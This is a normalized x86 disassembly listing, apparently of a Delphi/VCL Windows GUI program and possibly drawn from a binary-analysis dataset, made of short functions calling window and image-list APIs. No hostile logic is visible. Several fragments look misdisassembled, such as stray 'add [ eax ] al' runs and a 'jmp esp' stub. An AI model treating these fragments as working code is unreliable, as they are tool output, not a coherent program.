sub_43b4bc
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
retn
sub_43b508
retn
sub_43b6c0
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffdb
call sub_40349c
pop esi
retn
sub_43b6d4
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffda
call sub_40349c
pop esi
retn
sub_43b6e8
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_43b6f4
mov eax 0x4
retn
sub_43b6fc
retn
sub_43c2ed
jmp sub_403740
sub_43c5da
jmp sub_4039f4
sub_43c64c
jmp sub_4039f4
sub_43c658
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
xor eax eax
call sub_43c380
sub_43c7d7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_41e3b8
retn
sub_43c7ed
jmp sub_4039f4
sub_43c814
jmp sub_4039f4
sub_43c896
jmp sub_4039f4
sub_43c8be
jmp sub_4039f4
sub_43c8c5
mov esp ebp
pop ebp
retn
sub_43c97d
jmp sub_4039f4
sub_43c9d4
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x58 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_43c9a0
mov [ ebx + 0x58 ] esi
sub_43cb28
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_43cb3c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403450
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_43cc25
jmp sub_4039f4
sub_43cc2c
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43ccaf
jmp sub_4039f4
sub_43ccb6
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_43d084
xor eax eax
retn
sub_43d088
mov al [ eax + 0x58 ]
retn
sub_43d08c
xor eax eax
retn
sub_43d090
cmp [ eax + 0x30 ] 0x0
setne al
retn
sub_43d098
mov eax [ eax + 0x30 ]
retn
sub_43d13c
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x10 ]
retn
sub_43d1e8
push ebx
mov ebx eax
xor eax eax
mov al [ ebx + 0x5b ]
mov al [ eax + rw-data ]
cmp al [ ebx + 0x61 ]
setne al
pop ebx
retn
sub_43d200
mov [ eax + 0x5d ] dl
retn
sub_43d204
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
xchg edx eax
call sub_440dfc
sub_43d214
push ebx
cmp [ eax + 0xfa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
sub_43d6f7
jmp sub_4039f4
sub_43d6fe
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43d760
test [ eax + 0x1c ] 0x1
jne r-xdata
mov [ eax + 0x158 ] edx
retn
mov [ eax + 0x150 ] 0x1
sub_43d7e4
xor ecx ecx
mov [ edx ] ecx
xor ecx ecx
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x48 ]
mov [ edx + 0x8 ] ecx
mov eax [ eax + 0x4c ]
mov [ edx + 0xc ] eax
retn
sub_43d901
jmp sub_4039f4
sub_43d908
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43da04
push eax
xor ecx ecx
mov edx 0xb037
call sub_43efc4
retn
sub_43dbc5
add [ eax ] al
add [ esi + 0x3a ] dl
push eax
pop esp
je r-xdata
pop esi
retn
mov [ eax + 0x5c ] dl
test dl dl
je r-xdata
mov si 0xffee
call sub_40349c
sub_43dc76
jmp sub_4039f4
sub_43dc7d
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43dd54
cmp dl [ eax + 0x58 ]
je r-xdata
retn
mov [ eax + 0x58 ] dl
push 0x0
xor ecx ecx
mov edx 0xb00c
call sub_43efc4
sub_43dd6c
push 0x0
xor ecx ecx
mov edx 0xe
call sub_43efc4
retn
sub_43dd7c
push edx
mov edx 0xd
call sub_43efc4
retn
sub_43dd88
mov edx [ eax + 0xac ]
test edx edx
jle r-xdata
mov eax [ eax + 0x4c ]
retn
mov eax edx
retn
sub_43dd9c
mov edx [ eax + 0xa8 ]
test edx edx
jle r-xdata
mov eax [ eax + 0x48 ]
retn
mov eax edx
retn
sub_43de7d
jmp sub_4039f4
sub_43de84
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43de8c
cmp dl [ eax + 0x5f ]
je r-xdata
retn
mov [ eax + 0x5f ] dl
mov [ eax + 0x60 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb03c
call sub_43efc4
sub_43defc
cmp [ eax + 0x59 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x56 ] 0x0
je r-xdata
mov al 0x1
retn
sub_43df10
mov al [ eax + 0x9a ]
xor al 0x1
retn
sub_43df1c
mov al [ eax + 0x60 ]
xor al 0x1
retn
sub_43df24
cmp dl [ eax + 0x59 ]
je r-xdata
retn
mov [ eax + 0x59 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb008
call sub_43efc4
sub_43df48
cmp dl [ eax + 0x99 ]
je r-xdata
retn
mov [ eax + 0x99 ] dl
mov [ eax + 0x9a ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb022
call sub_43efc4
sub_43df6c
cmp dl [ eax + 0x9a ]
je r-xdata
retn
mov [ eax + 0x9a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb023
call sub_43efc4
sub_43dfb4
mov al [ eax + 0x5a ]
xor al 0x1
retn
sub_43dfbc
cmp dl [ eax + 0x5a ]
je r-xdata
retn
mov [ eax + 0x5a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb009
call sub_43efc4
sub_43dfe0
cmp dl [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
call sub_43efc4
sub_43e004
cmp dx [ eax + 0x78 ]
je r-xdata
retn
mov [ eax + 0x78 ] dx
push 0x0
xor ecx ecx
mov edx 0xb00f
call sub_43efc4
sub_43e020
push ebx
mov ebx eax
call sub_43afa0
cmp ebx eax
sete al
pop ebx
retn
sub_43e058
push esi
mov dl 0x1
mov si 0xffce
call sub_40349c
pop esi
retn
sub_43e1a2
jmp sub_4039f4
sub_43e1a9
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43e2cc
test [ eax + 0x50 ] 0x40
setne cl
mov dl [ eax + 0x57 ]
call sub_43e240
retn
sub_43e320
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
sub_43e334
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_43e419
jmp sub_4039f4
sub_43e438
xor eax eax
retn
sub_43e43c
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_43e454
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_43e46c
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x1
je r-xdata
mov al 0x1
retn
sub_43e484
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
mov al [ eax + 0x5f ]
dec eax
sub al 0x2
jb r-xdata
mov al 0x1
retn
sub_43e4a0
mov edx [ rw-data ]
mov ecx [ edx + 0x8 ]
mov edx [ rw-data ]
mov dl [ edx + 0x4 ]
call sub_43e4b8
retn
sub_43e57c
retn
sub_43e580
cmp eax [ rw-data ]
sete al
retn
sub_43e5f4
push ebx
cmp [ eax + 0x112 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
sub_43e710
push ebp
mov ebp esp
push esi
mov si 0xffd2
call sub_40349c
pop esi
pop ebp
retn 0x4
sub_43e750
push ebx
cmp [ eax + 0x102 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
sub_43e9e7
jmp sub_4039f4
sub_43e9ee
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43e9f8
push esi
mov esi eax
xor ecx ecx
mov eax esi
mov si 0xffe8
call sub_40349c
pop esi
retn
sub_43ea0c
push esi
mov esi eax
mov cl 0x1
mov eax esi
mov si 0xffe8
call sub_40349c
pop esi
retn
sub_43ecdb
jmp sub_4039f4
sub_43ed84
push esi
mov si 0xffee
call sub_40349c
pop esi
retn
sub_43ed90
mov al 0x1
retn
sub_43f068
mov ecx [ edx ]
mov [ eax + 0x40 ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x44 ] ecx
mov ecx [ edx + 0x8 ]
sub ecx [ edx ]
mov [ eax + 0x48 ] ecx
mov ecx [ edx + 0xc ]
sub ecx [ edx + 0x4 ]
mov [ eax + 0x4c ] ecx
call sub_43d44c
retn
sub_43f08c
retn
sub_43f2a5
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_4174f8
mov [ ebx + 0x5e ] al
pop esi
pop ebx
retn
sub_43f2c0
mov al [ eax + 0x5e ]
xchg edx eax
call sub_419830
retn
sub_43f3b8
push ebx
cmp [ eax + 0x12a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
sub_43f9d0
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_43f9d8
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_43f9e0
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_43fa98
push esi
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
retn
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43fab8
push ebx
mov ebx eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x99 ]
mov eax ebx
call sub_43df48
mov [ ebx + 0x9a ] 0x1
sub_43fb10
push ebx
mov ebx eax
cmp [ ebx + 0x56 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x84 ]
mov eax ebx
call sub_43deec
mov [ ebx + 0x56 ] 0x1
sub_43fb34
mov [ edx + 0xc ] 0x1
retn
sub_43fb3c
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb013
call sub_43efc4
sub_43fb54
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb014
call sub_43efc4
sub_43fb6c
xor eax eax
mov [ edx + 0xc ] eax
retn
sub_43fdd2
jmp sub_4039f4
sub_43fdd9
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43fe04
mov eax [ r-xdata ]
retn
sub_43ffa0
jmp sub_4039f4
sub_43ffa7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4400c8
mov eax [ eax + 0xb8 ]
retn
sub_440130
push ebx
mov ebx eax
mov eax ebx
call sub_43e454
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax 0x20000
pop ebx
retn
sub_44014c
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_4402e4
mov eax [ eax + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_440314
mov edx [ eax ]
call [ edx + 0x34 ]
retn
sub_44031c
call sub_43ceb8
retn
sub_44041c
jmp sub_4039f4
sub_4405dc
jmp sub_4039f4
sub_44062c
jmp sub_4039f4
sub_440664
retn
sub_4408ed
jmp sub_4039f4
sub_440a75
jmp sub_4039f4
sub_440dd7
jmp sub_4039f4
sub_440e83
jmp sub_4039f4
sub_440e90
inc [ eax + 0x160 ]
retn
sub_440e98
dec [ eax + 0x160 ]
cmp [ eax + 0x160 ] 0x0
jne r-xdata
retn
test [ eax + 0x54 ] 0x10
je r-xdata
call sub_440eb8
sub_440eb8
xor edx edx
call sub_440dfc
retn
sub_440f85
jmp sub_4039f4
sub_440f8c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44107b
jmp sub_4039f4
sub_4415a2
jmp sub_4039f4
sub_4415a9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_441771
jmp sub_4039f4
sub_441778
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44184c
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov al 0x1
retn
sub_441a39
jmp sub_4039f4
sub_441a40
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x180 ] edx
pop ecx
pop ebp
retn
sub_441b30
xor eax eax
retn
sub_441b98
cmp [ eax + 0x180 ] 0x0
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0xb033
call sub_43efc4
sub_441cc6
jmp sub_403740
sub_441dfb
jmp sub_4039f4
sub_441e02
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_403740#9
jmp sub_403740
sub_441e11
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45dfe8
call sub_403aa8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4423cc
jmp sub_4039f4
sub_4423d3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4423dc
add esp 0xfffffff0
mov [ esp ] 0xf
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
retn
sub_4428da
jmp sub_4039f4
sub_44292c
push ebx
mov ebx eax
call sub_41ca54
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax ebx
call sub_43efc4
pop ebx
retn
sub_442948
mov ecx [ edx + 0x8 ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx 0xb025
call sub_43efc4
retn
sub_44295c
push 0x0
xor ecx ecx
mov edx 0xb026
call sub_43efc4
retn
sub_44296c
push 0x0
xor ecx ecx
mov edx 0xb027
call sub_43efc4
retn
sub_442c18
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_444908
pop esi
retn
sub_442d2c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_442d7c
pop esi
retn
sub_442d40
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_442e68
pop esi
retn
sub_442d54
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_442d68
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x0
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_442e5b
jmp sub_4039f4
sub_442e62
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_442ef2
jmp sub_4039f4
sub_442ef9
pop ebx
pop ecx
pop ebp
retn
sub_442f00
push esi
mov esi edx
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop esi
retn
sub_442f10
retn
sub_442f14
push ebx
cmp [ eax + 0x1c2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
sub_442f34
push ebx
cmp [ eax + 0x1ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1cc ]
call [ ebx + 0x1c8 ]
sub_443094
mov edx [ eax + 0x178 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_443164
retn
sub_44327c
jmp sub_4039f4
sub_443283
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44334e
jmp sub_4039f4
sub_443378
xor ecx ecx
mov [ edx + 0xc ] ecx
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
retn
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov edx [ edx + 0x8 ]
mov eax [ eax + 0x17c ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
sub_44340a
jmp sub_4039f4
sub_4435dc
push ebx
cmp [ eax + 0x1e2 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1e4 ]
call [ ebx + 0x1e0 ]
sub_443880
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x180 ] eax
mov [ esi + 0x1a6 ] 0x0
pop esi
retn
sub_44395c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov dx 0xb023
mov eax esi
call sub_441388
pop esi
retn
sub_443a20
push esi
mov si 0xffc1
call sub_40349c
pop esi
retn
sub_443a4c
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_443a60
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_443a74
call sub_441348
retn
sub_443a7c
call sub_441348
retn
sub_443a84
call sub_441348
retn
sub_443b2c
push ebx
mov ebx eax
mov eax ebx
call sub_43f9e0
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x170 ]
call sub_41dbec
mov dx 0xb009
mov eax ebx
call sub_441388
pop ebx
retn
sub_443c90
call sub_441348
retn
sub_443c98
call sub_441348
retn
sub_443ca0
call sub_441348
retn
sub_443ca8
call sub_441348
retn
sub_443d0c
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_4441a2
jmp sub_4039f4
sub_4441a9
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_444288
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc0 ]
sub_44442c
push 0x0
xor ecx ecx
mov edx 0xb034
call sub_43efc4
retn
sub_4444cc
push ebx
mov ebx eax
mov eax ebx
call sub_4448fc
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x180 ]
push eax
call UpdateWindow
sub_4444e8
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
pop ebx
retn
sub_4446c0
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax ebx
call sub_4445f8
push eax
call GetClientRect
pop esi
pop ebx
retn
sub_444718
cmp edx [ eax + 0x16c ]
je r-xdata
retn
mov [ eax + 0x16c ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_43efc4
sub_444738
cmp dl [ eax + 0x1a5 ]
je r-xdata
retn
mov [ eax + 0x1a5 ] dl
mov [ eax + 0x1a9 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb010
call sub_43efc4
sub_44475c
mov al [ eax + 0x1a9 ]
xor al 0x1
retn
sub_444768
cmp dl [ eax + 0x1a9 ]
je r-xdata
retn
mov [ eax + 0x1a9 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
call sub_43efc4
sub_444814
test [ eax + 0x54 ] 0x8
je r-xdata
call sub_4447b8
retn
movsx edx dx
mov [ eax + 0x1a0 ] edx
retn
sub_4448f0
jmp sub_4039f4
sub_4448f7
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_444b16
jmp sub_4039f4
sub_444b1d
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_444c24
call sub_43ed94
retn
sub_445072
jmp sub_4039f4
sub_445108
mov eax [ r-xdata ]
retn
sub_44526f
jmp sub_4039f4
sub_445380
cmp dl [ eax + 0x165 ]
je r-xdata
retn
mov [ eax + 0x165 ] dl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_43efc4
sub_4453a0
cmp edx [ eax + 0x168 ]
je r-xdata
retn
mov [ eax + 0x168 ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_43efc4
sub_4456b6
jmp sub_4039f4
sub_4457f8
test [ eax + 0x52 ] 0x4
setne al
retn
sub_445954
jmp sub_4039f4
sub_44595b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_41e3b8
retn
sub_445977
jmp sub_4039f4
sub_445984
retn
sub_445a58
mov [ edx + 0xc ] 0xffffffff
retn
sub_445ab6
jmp sub_4039f4
sub_445abd
pop ecx
pop ecx
pop ebp
retn
sub_445b5d
jmp sub_4039f4
sub_445b64
pop ebx
mov esp ebp
pop ebp
retn
sub_445bd0
call sub_441b50
retn
sub_445c63
jmp sub_4039f4
sub_445c6a
pop esi
pop ecx
pop ecx
pop ebp
retn
sub_445e49
jmp sub_4039f4
sub_445e50
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_445fac
push ebx
mov ebx eax
mov eax ebx
call sub_44af74
or edx 0xffffffff
mov eax ebx
call sub_4460d8
pop ebx
retn
sub_446084
jmp sub_4039f4
sub_4460d8
cmp dx [ eax + 0x68 ]
je r-xdata
retn
mov [ eax + 0x68 ] dx
cmp [ eax + 0x6a ] 0x0
je r-xdata
call sub_445fc4
sub_446248
push ebx
mov ebx eax
mov eax ebx
call sub_44b02c
test al al
je r-xdata
pop ebx
retn
push 0xffffffff
call ImageList_DragShowNolock
sub_446260
push ebx
mov ebx eax
mov eax ebx
call sub_44b02c
test al al
je r-xdata
pop ebx
retn
push 0x0
call ImageList_DragShowNolock
sub_44634c
push ebx
push esi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x100
mov edx esi
mov eax ebx
call sub_442788
and [ ebx + 0x54 ] 0xfeff
pop esi
pop ebx
retn
sub_4463e7
jmp sub_4039f4
sub_4463ee
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446411
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41e3b8
retn
sub_44640a
jmp sub_4039f4
sub_446411
pop ebx
pop ecx
pop ebp
retn
sub_446418
retn
sub_446480
xor edx edx
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax edx
retn
mov eax [ eax + 0xc ]
inc edx
test eax eax
jne r-xdata
sub_4467ed
jmp sub_4039f4
sub_4469d4
mov eax [ eax + 0x8 ]
jmp r-xdata
mov edx [ eax + 0xc ]
test edx edx
jne r-xdata
mov eax edx
retn
sub_446bc0
jmp sub_4039f4
sub_446c70
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
add [ ecx + 0x4 ] 0xc
retn
add [ ecx ] 0xc
retn
sub_446c84
inc [ eax + 0x6c ]
retn
sub_446c88
dec [ eax + 0x6c ]
cmp [ eax + 0x6c ] 0x0
jg r-xdata
retn
xor edx edx
mov [ eax + 0x6c ] edx
call sub_448508
sub_446de8
call sub_4474e8
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
retn
sub_447793
jmp sub_4039f4
sub_44779a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4477b7
lea eax [ ebp - 0xc ]
call sub_404074
retn
sub_4477b0
jmp sub_4039f4
sub_4477b7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447a98
jmp sub_4039f4
sub_447a9f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447abc
mov eax [ ebp - 0x4 ]
call sub_41e3b8
retn
sub_447ab5
jmp sub_4039f4
sub_447abc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447ad9
mov eax [ ebp - 0x4 ]
call sub_4032a0
retn
sub_447ad2
jmp sub_4039f4
sub_447ad9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447f8d
jmp sub_4039f4
sub_447f94
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44811f
jmp sub_4039f4
sub_448126
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4481db
jmp sub_4039f4
sub_4481e2
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4482d0
jmp sub_4039f4
sub_448321
jmp sub_4039f4
sub_448328
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4483e4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_446cf4
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
sub_448530
cmp [ eax + 0x6c ] 0x0
jne r-xdata
retn
mov eax edx
call sub_446830
sub_448e30
jmp sub_4039f4
sub_448e37
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_448f00
call GetCapture
retn
sub_448f08
push ebx
mov ebx edx
push ebx
call GetCursorPos
call sub_40cb5c
pop ebx
retn
sub_448f18
push ebx
mov ebx eax
push 0x13
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebx + 0xc ] al
pop ebx
retn
sub_44917e
jmp sub_4039f4
sub_449378
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push eax
call [ rw-data ]
retn
sub_44958c
jmp sub_4039f4
sub_449593
pop ebx
mov esp ebp
pop ebp
retn
sub_4495de
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
pop ebx
retn
sub_44965b
jmp sub_4039f4
sub_449662
pop ebp
retn
sub_4496ea
jmp sub_4039f4
sub_4496f1
pop ebp
retn
sub_449938
stc
push ebx
push eax
jmp esp
sub_449e40
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x30 ]
xchg edx eax
call sub_413e40
retn
sub_449e58
mov al 0x1
retn
sub_449e5c
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
call sub_41a514
retn
mov eax edx
retn
sub_449e6c
cmp [ eax + 0x5c ] 0x0
je r-xdata
call sub_41a4e4
retn
mov al 0x1
retn
sub_44a15c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_413de4
pop esi
pop ebx
retn
sub_44a170
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_44a1ac
cmp edx [ eax + 0x38 ]
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0x30 ]
sub_44a410
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40342c
pop ebx
retn
sub_44a424
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40342c
pop ebx
retn
sub_44a438
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40342c
pop ebx
retn
sub_44a44c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40342c
pop ebx
retn
sub_44a460
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40342c
pop ebx
retn
sub_44a474
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40342c
pop ebx
retn
sub_44a488
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40342c
pop ebx
retn
sub_44a49c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40342c
pop ebx
